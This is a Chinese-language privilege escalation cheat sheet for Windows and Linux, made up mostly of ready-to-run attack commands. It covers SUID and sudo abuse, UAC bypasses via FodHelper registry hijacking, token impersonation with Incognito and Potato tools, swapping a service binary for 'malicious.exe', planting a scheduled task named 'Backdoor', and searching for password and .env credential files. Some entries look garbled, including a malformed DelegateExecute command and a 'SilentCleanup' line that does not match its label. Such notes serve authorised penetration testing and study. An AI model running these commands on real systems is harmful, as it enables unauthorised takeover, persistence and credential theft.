# 权限提升补充

## 1. Windows提权

### 信息收集

```cmd
systeminfo
whoami /all
whoami /priv
net user username
net localgroup administrators
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 查找可利用服务

```cmd
sc query state=all
accesschk.exe -uwcqv "Authenticated Users" *
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### 服务路径空格

```cmd
sc qc service_name
```

---

## 2. Linux提权

### 信息收集

```bash
uname -a
cat /etc/issue
id
whoami
sudo -l
find / -perm -4000 2>/dev/null
```

### SUID提权

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null

# 常见可利用SUID
/usr/bin/find
/usr/bin/vim
/usr/bin/less
/usr/bin/nano
```

### SUDO提权

```bash
# 检查sudo配置
sudo -l

# 利用
sudo su
sudo bash
sudo /bin/sh
```

### 内核漏洞

```bash
# 信息收集
uname -a
cat /proc/version

# 搜索漏洞
searchsploit linux kernel $(uname -r)
```

---

## 3. UAC绕过

### 方法1: SilentCleanup

```cmd
cmd /c set __COMPAT_LAYER=RunAsInvoker && reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 1 /f && explorer.exe
```

### 方法2: FodHelper

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd /c calc" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /DelegateExecute "None"
```

### 方法3: CMSTP

```cmd
cmstp.exe /s /au
```

---

## 4. 令牌窃取

### Incognito

```bash
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### RottenPotato

```bash
rottenpotato.exe
```

### Juicy Potato

```bash
JuicyPotato.exe -l 1337 -p shell.exe -t *
```

---

## 5. 服务提权

### 可执行文件替换

```cmd
sc config ServiceName binPath= "malicious.exe"
sc start ServiceName
```

### 服务路径劫持

```cmd
sc qc service_name
# 检查路径是否有空格
```

---

## 6. DLL劫持

### 原理

- 查找高权限程序加载的DLL
- 在可写目录创建同名DLL

### 工具

```
Process Monitor
PowerUp.ps1
```

---

## 7. 计划任务提权

### 创建计划任务

```cmd
schtasks /create /tn "Backdoor" /tr "C:\shell.exe" /sc daily /st 09:00
```

### 利用现有任务

```cmd
schtasks /query /fo LIST /v
```

---

## 8. 令牌窃取与模拟

### SeImpersonatePrivilege

```bash
# Potato家族
JuicyPotato.exe
PrintSpoofer.exe
GodPotato.exe
```

---

## 9. 密码查找

### 敏感文件

```bash
# Windows
findstr /s /i password *.txt *.config *.xml
dir /s *pass*.txt

# Linux
grep -r "password" /etc/
find / -name "*password*"
```

### 配置文件

```bash
# 数据库配置
cat /var/www/html/config.php
cat /var/www/.env
```
